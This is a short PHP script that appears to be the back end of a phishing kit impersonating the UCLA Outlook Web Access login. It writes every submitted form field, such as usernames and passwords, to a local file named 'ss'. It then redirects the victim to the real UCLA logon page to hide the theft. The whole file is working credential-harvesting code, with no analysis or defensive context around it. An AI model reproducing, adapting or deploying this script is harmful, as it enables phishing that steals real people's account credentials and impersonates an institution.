<?php
header ('Location:https://mail.em.ucla.edu/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail.em.ucla.edu%2fowa%2f');
$handle = fopen("ss", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 